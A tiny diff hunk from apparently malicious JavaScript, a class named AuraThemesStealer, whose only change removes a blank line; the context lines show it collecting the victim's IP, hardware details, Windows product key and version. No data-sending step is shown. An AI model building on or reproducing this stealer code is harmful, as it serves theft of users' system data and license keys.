@@ -13,7 +13,6 @@ class AuraThemesStealer {
     constructor() {
         this.aurita();
     }
-
     async aurita() {
         try {
             const { DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION } = await getInfo();
